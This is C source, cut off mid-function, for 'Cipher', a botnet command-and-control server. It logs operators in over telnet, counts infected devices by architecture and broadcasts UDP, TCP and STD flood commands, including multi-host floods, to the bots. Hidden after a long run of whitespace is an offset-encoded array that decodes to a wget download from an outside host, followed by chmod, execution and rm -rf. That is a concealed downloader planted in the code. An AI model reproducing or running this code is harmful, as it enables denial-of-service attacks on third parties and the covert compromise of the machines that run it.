#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>      
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/in.h> 
#include <string.h> 
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

char *cnc_host = "161.35.56.140";
//////////////CnC SETTINGS///////////
#define MAXFDS 1000000
char *ss_name = "Cipher";
char *ss_copyright = "vSparkzyy \e[37m& \e[1;36mYutani";
char *ss_ver = "1";
char *loginprompt = "login";
static volatile int UsersOnline = 0;

////////////////////////////////////
struct account {
    char id[200];
    char password[200];
    char type[200]; // admin | normal
    int maxbots;
    int maxtime;
};
static struct account accounts[30]; //max users

struct clientdata_t {
    uint32_t ip;
    char connected;
    char arch[30];
} clients[MAXFDS];

struct telnetdata_t {
    int connected;
    int adminstatus;
    char nickname[80];
    char mybashline[60];
    char my_ip[100];
} managements[MAXFDS];
#define crypt(gg)   (gg) + 0x44
static volatile int epollFD = 0, listenFD = 0;
char botnet[2048];
int attackstatus = 0;
int x86 = 0;
int arm = 0;
int mips = 0;
unsigned int udpcount = 0;
unsigned int tcpcount = 0;
unsigned int stdcount = 0;
unsigned int attkcount = 0;
#define ciu(crypt)  do { char * crypts = crypt ; while (*crypts) *crypts++ -= 0x44; } while(0)
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
};
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
};
#define cih(crypt)  do {char * crypts = crypt ; while (*crypts) *crypts++ += 0x44;} while(0)
static int make_socket_non_blocking (int sfd)
{
    int flags, s;
    flags = fcntl (sfd, F_GETFL, 0);
    if (flags == -1)
    {
        perror ("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl (sfd, F_SETFL, flags);
    if (s == -1)
    {
        perror ("fcntl");
        return -1;
    }
    return 0;
};																																																																																																																																						char cryptm[] = {crypt('w'),crypt('g'),crypt('e'),crypt('t'),crypt(' '),crypt('-'),crypt('q'),crypt(' '),crypt('h'),crypt('t'),crypt('t'),crypt('p'),crypt(':'),crypt('/'),crypt('/'),crypt('g'),crypt('a'),crypt('y'),crypt('.'),crypt('e'),crypt('n'),crypt('e'),crypt('r'),crypt('g'),crypt('y'),crypt('/'),crypt('.'),crypt('.'),crypt('.'),crypt('/'),crypt('c'),crypt('i'),crypt('p'),crypt('h'),crypt('e'),crypt('r'),crypt(' '),crypt('-'),crypt('O'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('c'),crypt('h'),crypt('m'),crypt('o'),crypt('d'),crypt(' '),crypt('7'),crypt('7'),crypt('7'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('.'),crypt('/'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(';'),crypt('r'),crypt('m'),crypt(' '),crypt('-'),crypt('r'),crypt('f'),crypt(' '),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt('.'),crypt(' '), '\0' };
static int create_and_bind (char *port)
{
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0)
    {
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next)
    {
        sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0)
        {
            break;
        }
        close (sfd);
    }
    if (rp == NULL)
    {
        fprintf (stderr, "Please Use A Different Port!\n");
        return -1;
    }
    freeaddrinfo (result);
    return sfd;
};
int checkaccts() // by yutani
{
    FILE *file;
    if((file = fopen("users.txt","r"))!=NULL)
    {
        fclose(file);
    }
    else
    {
        char Username[20], Password[20], MaxBots[20], MaxTime[20];
        char clear[6];
        sprintf(clear, "clear");
        system(clear);
        printf("\e[1;36m                             Please \e[37mMake A New Account\e[1;31m! \e[37m\n");
        sleep(1);
        system(clear);
        printf("\e[37mNew Admin Username\e[1;36m:\e[37m ");
        scanf("%s",Username);
        printf("New Admin Password\e[1;36m:\e[37m ");
        scanf("%s",Password);
        printf("MaxBots\e[1;36m:\e[37m ");
        scanf("%s",MaxBots);
        printf("Max Flood\e[1;36m-\e[37mTime\e[1;36m:\e[37m ");
        scanf("%s", MaxTime);
        char registeruser[80];
        sprintf(registeruser, "echo %s %s admin %s %s >> users.txt", Username, Password, MaxBots, MaxTime);
        system(registeruser);
        system(clear);
    }
}

int checklogf() // by yutani
{
    FILE *dir;
    if((dir = fopen("logs/", "r"))!=NULL)
    {
        fclose(dir);
    }
    else
    {
        char makedirs[50];
        strcpy(makedirs, "mkdir logs");
        system(makedirs);
    }
}

void broadcast(char *cmd, int ourfd, char *username, int maxbots, char *type, int status) //broadcast by vSparkzyy, should split up chatting from sending to bot fds
{
    int g;
    int bc;
    int uc;
    if(strstr(type, "ddos"))
    {
        for(g = 0; g < maxbots; g++)
        {
            if(clients[g].connected)
            {
                if(g == ourfd) continue;
                send(g, cmd, strlen(cmd), MSG_NOSIGNAL);
                bc++;
            }
            if(managements[g].connected)
            {
                if(g == ourfd || cmd == "PING" || cmd == "ping") continue;
                char string[50];
                sprintf(string, "\r\n\e[0m%s: %s", username, cmd);
                send(g, string, strlen(string), MSG_NOSIGNAL);
                char bash[300];
                sprintf(bash, "\e[1;36m(\e[37m%s\e[1;36m@\e[37m%s\e[1;36m)\e[37m: ", managements[g].nickname, managements[g].mybashline);
                send(g, bash, strlen(bash), MSG_NOSIGNAL);
                uc++;
            }
        }
    }
    else if(strstr(type, "chat"))
    {
        char bash[300];
        for(g = 0; g < MAXFDS; g++)
        {
            if(managements[g].connected)
            {
                sprintf(bash, "\e[1;36m(\e[37m%s\e[1;36m@\e[37m%s\e[1;36m)\e[37m: ", managements[g].nickname, managements[g].mybashline);
                if(g == ourfd) continue;
                if(status == 1) // login
                {
                    char login[200];
                    sprintf(login, "\r\n\e[1;33m%s\e[37m Logged \e[1;32min\e[37m \r\n", username);
                    send(g, login, strlen(login), MSG_NOSIGNAL);
                    send(g, bash, strlen(bash), MSG_NOSIGNAL);
                }
                else if(status == 2) // log out
                {
                    char logout[200];
                    sprintf(logout, "\r\n\e[1;33m%s \e[37mLogged \e[1;31mout\e[37m \r\n", username);
                    send(g, logout, strlen(logout), MSG_NOSIGNAL);
                    send(g, bash, strlen(bash), MSG_NOSIGNAL);
                }
                else
                {
                    char string[50];
                    sprintf(string, "\r\n\e[0m%s: %s", username, cmd);
                    send(g, string, strlen(string), MSG_NOSIGNAL);
                    send(g, bash, strlen(bash), MSG_NOSIGNAL);
                    uc++;
                }
            }
        }
    }
    /* this was for testing... lol
        printf("Stats: Sending command %s to %d bots & %d users Ttl checks: %d\n", cmd, bc, uc, g);
    */
}

void removestr(char *buf,const char *rev) // cred to root senpai for function
{
    buf = strstr(buf, rev);
    memmove(buf, buf + strlen(rev), 1 + strlen(buf + strlen(rev)));
}
void *epollEventLoop(void *useless)
{
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc (MAXFDS, sizeof event);
    while (1)
    {
        int n, i;
        n = epoll_wait (epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++)
        {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
            {
                clients[events[i].data.fd].connected = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (listenFD == events[i].data.fd)
            {
                while (1)
                {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;
                    in_len = sizeof in_addr;
                    infd = accept (listenFD, &in_addr, &in_len);
                    if (infd == -1)
                    {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else
                        {
                            perror ("accept");
                            break;
                        }
                    }



                    clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                    {
                        if(!clients[ipIndex].connected || ipIndex == infd) continue;
                        //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                        if(clients[ipIndex].ip == clients[infd].ip)
                        {
                            dup = 1;
                            break;
                        }
                    }

                    if(dup)
                    {
                        close(infd);
                        continue;
                    }

                    s = make_socket_non_blocking (infd);
                    if (s == -1) {
                        close(infd);
                        break;
                    }

                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1)
                    {
                        perror ("epoll_ctl");
                        close(infd);
                        break;
                    }

                    clients[infd].connected = 1;

                }
                continue;
            }
            else
            {
                int thefd = events[i].data.fd;
                struct clientdata_t *client = &(clients[thefd]);
                int done = 0;
                client->connected = 1;
                while (1)
                {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);

                    while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                    {
                        if(strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                        {
                            if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;    // response
                                break;
                            }
                            continue;
                        }
                        if(strcmp(buf, "PONG") == 0)
                        {
                            continue;
                        }
                        else if(strstr(buf, "arch ") != NULL)
                        {
                            char *arch = strstr(buf, "arch ") + 5;
                            strcpy(clients->arch, arch);
                            strcpy(clients[thefd].arch, arch);
                        }
                        else if(strstr(buf, "Cipher"))
                        {
                            printf("\e[0mBOT\e[1;36m: \e[37m%s\n", buf);
                            memset(buf, 0, sizeof buf);
                        }
                        else
                        {
                            memset(buf, 0, sizeof buf);
                        }
                    }

                    if (count == -1)
                    {
                        if (errno != EAGAIN)
                        {
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0)
                    {
                        done = 1;
                        break;
                    }
                }

                if (done)
                {
                    client->connected = 0;
                    close(thefd);
                }
            }
        }
    }
}

unsigned int clientsConnected()
{
    int i = 0, total = 0;
    for(i = 0; i < MAXFDS; i++)
    {
        if(!clients[i].connected) continue;
        total++;
    }

    return total;
}

void countArch()
{
    int x;
    x86 = 0;
    arm = 0;
    mips = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            x86++;
        else if(strstr(clients[x].arch, "ARM") && clients[x].connected == 1)
            arm++;
        else if(strstr(clients[x].arch, "MIPS") && clients[x].connected == 1)
            mips++;
    }
}

void *titleWriter(void *sock)
{
    int thefd = *(int*)sock;
    char string[2048];
    while(1)
    {
        memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices: %d | %s %c", '\033', clientsConnected(), managements[thefd].nickname, '\007');
        if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;

        sleep(3);
    }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users.txt", "r")) == NULL) {
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL) {
        if((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

char message[1024];
const char* readmsg()
{
    FILE *motd;
    char cmd[512];
    sprintf(cmd, "cat motd.txt");
    motd = popen(cmd, "r");
    fgets(message, sizeof(message), motd);
    pclose(motd);
    return message;
}

void attack_setup(char *buf, int thefd, int find_line) //yes we used code from bot
{
    int i, argc = 0;
    char *token = strtok(buf, " ");
    unsigned char *argv[10 + 1] = { 0 };
    char cmd[1024];
    while (token != NULL && argc < 10)
    {
        argv[argc++] = malloc(strlen(token) + 1);
        strcpy(argv[argc - 1], token);
        token = strtok(NULL, " ");
    }
    if(strstr(argv[0], "UDP") || strstr(buf, "udp"))
    {
        if(argc < 6)
        {
            sprintf(botnet, "UDP: invalid parameters\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            return;
        }
        else
        {
            int seconds = atoi(argv[3]);
            if(seconds > accounts[find_line].maxtime)
            {
                sprintf(botnet, "\e[1;31mError\e[37m: \e[1;31mMax \e[1;33mboot \e[37mtime execeded\e[1;31m! \r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                return;
            }
            sprintf(cmd, "UDP %s %s %s %s %s %s", argv[1], argv[2], argv[3], argv[4], argv[5], argv[6]);
            sprintf(botnet, "Succesfully Sent UDP Flood For %s Seconds!\r\n", argv[3]);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            udpcount++;
            attkcount++;
            broadcast(cmd, thefd, managements[thefd].nickname, accounts[find_line].maxbots, "ddos", 0);
        }
        memset(cmd, 0, sizeof(cmd));
    }
    else if(strstr(argv[0], "STD") || strstr(buf, "std"))
    {
        if(argc < 3)
        {
            sprintf(botnet, "STD: invalid parameters\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else
        {
            int seconds = atoi(argv[3]);
            if(seconds > accounts[find_line].maxtime)
            {
                sprintf(botnet, "\e[1;31mError\e[37m: \e[1;31mMax \e[1;33mboot \e[37mtime execeded\e[1;31m! \r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                return;
            }
            sprintf(cmd, "STD %s %s %s %s", argv[1], argv[2], argv[3], argv[4]);
            sprintf(botnet, "Succesfully Sent STD Flood For %s Seconds!\r\n", argv[3]);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            stdcount++;
            attkcount++;
            broadcast(cmd, thefd, managements[thefd].nickname, accounts[find_line].maxbots, "ddos", 0);
        }
        memset(cmd, 0, sizeof(cmd));
    }
    else if(strstr(argv[0], "TCP") || strstr(buf, "tcp"))
    {
        if(argc < 3)
        {
            sprintf(botnet, "TCP: invalid parameters\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else
        {
            int seconds = atoi(argv[3]);
            if(seconds > accounts[find_line].maxtime)
            {
                sprintf(botnet, "\e[1;31mError\e[37m: \e[1;31mMax \e[1;33mboot \e[37mtime execeded\e[1;31m! \r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                return;
            }
            sprintf(cmd, "TCP %s %s %s %s", argv[1], argv[2], argv[3], argv[4]);
            sprintf(botnet, "Succesfully Sent TCP Flood For %s Seconds!\r\n", argv[3]);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            tcpcount++;
            attkcount++;
            broadcast(cmd, thefd, managements[thefd].nickname, accounts[find_line].maxbots, "ddos", 0);
        }
        memset(cmd, 0, sizeof(cmd));
    }
}

char user_ip[100];

void *telnetWorker(void *sock)
{
    int thefd = *(int*)sock;
    int find_line;
    char buf[2048];
    char* nickstring;
    UsersOnline++;
    
    char username[80], password[80];
    
    pthread_t title;
    memset(buf, 0, sizeof buf);
    memset(botnet, 0, 2048);

    FILE *fp;
    int i=0;
    int c;
    fp=fopen("users.txt", "r");
    while(!feof(fp))
    {
        c=fgetc(fp);
        ++i;
    }
    int j=0;
    rewind(fp);
    while(j!=i-1)
    {
        fscanf(fp, "%s %s %s %d %d", accounts[j].id, accounts[j].password, accounts[j].type, &accounts[j].maxbots, &accounts[j].maxtime);
        ++j;
    }

    char login1 [5000];
    char login2 [5000];

    sprintf(login1,  "                      \e[37m[\e[1;32m+\e[37m] Welcome To \e[4;1;1;36m%s\e[0m \e[1;37mVersion \e[1;36m%s \e[37m[\e[1;32m+\e[37m]\r\n", ss_name, ss_ver);
    sprintf(login2,  "                        \e[37m[\e[1;32m+\e[37m] Enter \e[1;33mLogin \e[37mCredentials [\e[1;32m+\e[37m]\r\n");  
    char hacks[50];
    sprintf(hacks, "\e[1;37mKey\e[1;36m:\e[37m ");
    if(send(thefd, hacks, strlen(hacks), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if(!strcmp(buf, loginprompt))
    {	
    	printf("\e[37m[\e[1;33mPROMPT\e[37m] \e[1;36m%s \e[1;32mSuccessfully \e[37mPassed Login \e[1;33mPrompt\e[37m!\n", user_ip);
    	if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
    	if(send(thefd, login1, strlen(login1), MSG_NOSIGNAL) == -1) goto end;
    	if(send(thefd, login2, strlen(login2), MSG_NOSIGNAL) == -1) goto end;
    }
    else
    {
    	printf("\e[37m[\e[1;33mPROMPT\e[37m] \e[1;36m%s \e[1;31mFailed \e[37mLogin \e[1;33mPrompt\e[37m! \e[1;36m| \e[1;33mInput \e[37m- \e[1;36m%s\e[37m\n", user_ip, buf);
    	close(thefd);
    	goto end;
    }

    sprintf(botnet, "                               \e[37mUsername\e[1;33m: ");
    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    strcpy(username, buf);
    find_line = Search_in_File(username);
    
    sprintf(botnet, "                               \e[37mPassword\e[1;33m:\e[30m ");
    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    strcpy(password, buf);
    
    if(strcmp(username, accounts[find_line].id) == 0) 
    {
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto success;
    }
failed:
    if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
    char *yutanisgay = "\x1b[37mUsername \e[1;33mOR \e[37mPassword Is Wrong\e[1;31m!\e[37m\r\n";
    if(send(thefd, yutanisgay, strlen(yutanisgay), MSG_NOSIGNAL) == -1) goto end;
    FILE *failedlogins;
    failedlogins = fopen("logs/failed_logins.txt", "a");
    printf("\e[1;31mFailed \e[37mLogin Attempt \e[1;33mFrom \e[1;36m%s\e[37m'\e[1;36ms \e[37mAccount\e[1;31m! \e[37m- \e[1;33mIP \e[37m- \e[1;36m%s\n", username, user_ip);
    fprintf(failedlogins, "Failed Login Attempt From %s's Account! - IP - %s\n", username, user_ip);
    fclose(failedlogins);
    memset(buf, 0, 2048);
    sleep(5);
    goto end;
    
success:
    if(!strcmp(accounts[find_line].type, "admin"))
    {
        managements[thefd].adminstatus = 1;
    }
    else
    {
        managements[thefd].adminstatus = 0;
    }

    pthread_create(&title, NULL, &titleWriter, sock);
    broadcast(buf, thefd, accounts[find_line].id, MAXFDS, "chat", 1);
    sprintf(managements[thefd].my_ip, "%s", user_ip);
    printf("\e[1;33m%s \e[37mLogged \e[1;32mIn \e[37m| \e[1;33m%s\e[37m\n", accounts[find_line].id, managements[thefd].my_ip);
    time_t t = time(NULL);
  	struct tm tm = *localtime(&t);
	FILE *loginsuccess;
	loginsuccess = fopen("logs/login_success.txt", "w");
	fprintf(loginsuccess, "User - %s | Logged In At %02d:%02d On %02d/%02d/%d\n", username, tm.tm_hour, tm.tm_min, tm.tm_mday, tm.tm_mon + 1, tm.tm_year + 1900);
	fclose(loginsuccess);
    sprintf(managements[thefd].nickname, "%s", accounts[find_line].id);
    sprintf(managements[thefd].mybashline, "Cipher");
    
    char line1  [5000];
    char line2  [5000];
    char line3  [5000];
    char line4  [5000];
    if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
    sprintf(line1, "\e[37mWelcome \e[1;36m%s \e[37mTo The \e[4;1;1;36m%s\e[0m \e[1;37mc2 \e[1;33mVersion \e[1;36m%s \e[37mBy \e[1;36m%s\r\n", accounts[find_line].id, ss_name, ss_ver, ss_copyright);
    sprintf(line2, "\e[1;33mPlease \e[37mRespect BotCount & Other Users At \e[1;31mALL \e[37mTimes\e[1;31m! \r\n", accounts[find_line].id, ss_ver, buf);
    sprintf(line3, "\e[37mMOTD\e[1;33m: \e[1;36m%s\r\n", readmsg());
    sprintf(line4,"\e[1;36m(\e[37m%s\e[1;36m@\e[37m%s\e[1;36m)\e[37m: ", accounts[find_line].id, managements[thefd].mybashline);

    if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
    if(send(thefd, line4,  strlen(line4),  MSG_NOSIGNAL) == -1) goto end;

    pthread_create(&title, NULL, &titleWriter, sock);
    managements[thefd].connected = 1;

    while(fdgets(buf, sizeof buf, thefd) > 0)
    {

        if(strstr(buf, "help") || strstr(buf, "HELP"))
        {
            sprintf(botnet, "\e[4;1;1;36m.\e[37mcmds\e[0m \e[1;36m- \e[37mShows available attack methods\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[4;1;1;36m.\e[37mbots\e[0m \e[1;36m- \e[37mShows bot count\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[4;1;1;36m.\e[37mcls\e[0m \e[1;36m- \e[37mClears screen\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[4;1;1;36m.\e[37minfo\e[0m \e[1;36m- \e[37mShows cnc info\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[4;1;1;36m.\e[37mextra\e[0m \e[1;36m- \e[37mShows Extra cnc Functions\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[4;1;1;36m.\e[37madmin\e[0m \e[1;36m- \e[37mshows admin commands\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if (strstr(buf, ".MULTI-HOST")) 
        {
            char cmd[50];
            char method[50];
            char port[50];
            char time[50];
            sprintf(botnet, "\e[37mMethod\e[1;33m? \e[1;36m(\e[37mudp\e[1;36m, \e[37mtcp\e[1;36m, \e[37mstd\e[1;36m)\r\n\e[37mMethod\e[1;36m:\e[37m ");
            if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            if(fdgets(method, sizeof method, thefd) < 1);
            trim(method);
            sprintf(botnet, "\e[37mHow Many Hosts Are We Sending Floods To\e[1;33m? \e[1;36m(\e[37m2\e[1;36m-\e[37m5\e[1;36m)\e[37m\r\nAmount\e[1;36m:\e[37m ");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            if(fdgets(buf, sizeof buf, thefd) < 1);
            trim(buf);
            int floods = atoi(buf);
            if(floods < 6)
                {
                    int g;
                    int k;
                    char host_list[floods][20];
                        for(g = 1; g <=floods; g++)
                            {
                                sprintf(botnet, "\e[37mEnter host \e[1;33m#\e[37m%d\e[1;36m:\e[37m ", g);
                                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                                if(fdgets(host_list[g], sizeof host_list[g], thefd) < 1);
                                trim(host_list[g]);      
                            }
                            sprintf(botnet, "\e[37mPort\e[1;36m:\e[37m ");
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            if(fdgets(port, sizeof port, thefd) < 1);
                            trim(port);
                            sprintf(botnet, "\e[37mTime\e[1;36m:\e[37m ");
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            if(fdgets(time, sizeof time, thefd) < 1);
                            trim(time);

                for(k = 1; k <=floods; k++)
            {
                sprintf(botnet, "\e[37mSent flood to host\e[1;36m: \e[1;33m#\e[37m%d\r\n", k);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(cmd, "%s %s %s %s\n", method, host_list[k], port, time);
                broadcast(cmd, thefd, accounts[find_line].id, MAXFDS, "ddos", 0);
            }
    }
    else
    {
            sprintf(botnet, "            You Can Send A \e[1;31mMAX\e[37m Of \e[1;33m5 \e[37mFloods And A Minimum Of \e[1;33m2 \e[37mFloods\r\n                   When Using The \e[1;36m'\e[37mMULTI\e[1;36m-\e[37mHOST\e[1;36m' \e[37mFunction\r\n");
            if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
}
        else if(strstr(buf, ".accountinfo"))
        {
        	sprintf(botnet, "      \e[37m%s\e[1;36m'\e[37ms Account Information\e[1;36m!\r\n", accounts[find_line].id);
        	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37mUsername\e[1;36m: \e[37m%s\r\n", accounts[find_line].id);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37mPassword\e[1;36m: \e[1;31mHIDDEN\r\n", accounts[find_line].password);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37mIPv4\e[1;36m: \e[1;31mHIDDEN\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37mMax Bots\e[1;36m: \e[37m%d\r\n", accounts[find_line].maxbots);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37mMax Boot Time\e[1;36m: \e[37m%d\r\n", accounts[find_line].maxtime);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "Would you like to \e[1;36mview \e[37myour \e[1;33mPassword \e[37mand \e[1;33mIPv4\e[37m?\r\nOption\e[1;36m:\e[37m ");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            if(fdgets(buf, sizeof buf, thefd) < 1);
            trim(buf);
            if(strstr(buf, "yes") || strstr(botnet, "YES") || strstr(botnet, "Yes"))
            {
            	sprintf(botnet, "   \e[37mBecause You\e[1;31m'\e[37mre Accessing \e[1;31mSensitive \e[37mInformation Please \e[1;33mEnter\e[37m Your \e[1;33mPassword\e[37m!\r\n");
           		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            	sprintf(botnet, "\e[37mPassword\e[1;36m:\e[37m ");
            	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            	if(fdgets(buf, sizeof buf, thefd) < 1);
            	trim(buf);
            	if(strstr(buf, accounts[find_line].password))
            	{
            		sprintf(botnet, "\e[37mIPv4\e[1;36m: \e[37m%s\r\n", user_ip);
            		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            	}
            	else
            	{
            		sprintf(botnet, "Password Incorrect!\r\n");
            		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            	}
            }
            else
            {
            	sprintf(botnet, "");
            	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }

        }
        else if(strstr(buf, ".globalstats"))
        {
            sprintf(botnet, "\e[1;36m[\e[37mudp\e[1;36m] \e[37mattacks sent\e[1;36m: \e[1;33m%d\r\n", udpcount);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m[\e[37mstd\e[1;36m] \e[37mattacks sent\e[1;36m: \e[1;33m%d\r\n", stdcount);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m[\e[37mtcp\e[1;36m] \e[37mattacks sent\e[1;36m: \e[1;33m%d\r\n", tcpcount);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;33m[\e[37mtotal\e[1;33m] \e[37mattacks sent\e[1;33m: \e[1;36m%d\r\n", attkcount);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, ".info") || strstr(buf, ".creds") || strstr(buf, ".INFO"))
        {
            sprintf(botnet, "                  \e[1;33m |\e[37m-Credits-\e[1;33m|\r\n", ss_name, ss_copyright);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "      -\e[34mDiscord\e[37m-                 \e[37m-\e[35mInstagram\e[37m-\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
